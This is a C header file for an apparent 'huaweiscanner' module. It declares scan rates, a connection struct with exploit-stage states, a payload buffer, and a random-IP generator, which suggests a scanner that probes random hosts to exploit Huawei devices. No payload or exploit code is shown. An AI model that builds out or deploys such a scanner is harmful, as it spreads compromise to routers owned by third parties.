#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define huaweiscanner_SCANNER_MAX_CONNS 512
#define huaweiscanner_SCANNER_RAW_PPS 720
#else
#define huaweiscanner_SCANNER_MAX_CONNS 128
#define huaweiscanner_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define huaweiscanner_SCANNER_RDBUF_SIZE 1024
#define huaweiscanner_SCANNER_HACK_DRAIN 64
#else
#define huaweiscanner_SCANNER_RDBUF_SIZE 256
#define huaweiscanner_SCANNER_HACK_DRAIN 64
#endif

struct huaweiscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        huaweiscanner_SC_CLOSED,
        huaweiscanner_SC_CONNECTING,
        huaweiscanner_SC_EXPLOIT_STAGE2,
        huaweiscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[huaweiscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void huaweiscanner_scanner_init();
void huaweiscanner_scanner_kill(void);

static void huaweiscanner_setup_connection(struct huaweiscanner_scanner_connection *);
static ipv4_t huaweiscanner_get_random_ip(void);
